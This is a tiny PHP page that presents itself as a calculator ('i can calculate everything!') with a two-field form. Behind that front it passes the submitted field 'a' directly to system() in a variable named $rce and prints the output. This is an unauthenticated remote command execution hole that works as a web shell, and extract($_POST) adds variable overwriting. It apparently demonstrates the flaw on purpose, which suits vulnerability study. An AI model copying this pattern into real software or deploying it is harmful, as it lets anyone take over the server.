<?php 

echo '<h1> i can calculate everything! </h1> <br>';
if(!empty($_POST['submit'])){
    extract($_POST);
    
    //$res = eval('$c = ($a * $b) + 1; echo $c;');
    //$res2 = $res + $a;
    //echo $res2;
    $rce = $_POST['a'];
    $c = system($rce);
    echo $c;
}


?>

<!doctype html>
<body>
    <form method="POST">
        <input name="a" type="text" placeholder="a">
        <input name="b" type="text" placeholder="b">
        <input type="submit" name="submit">
    </form>
</body>
</html>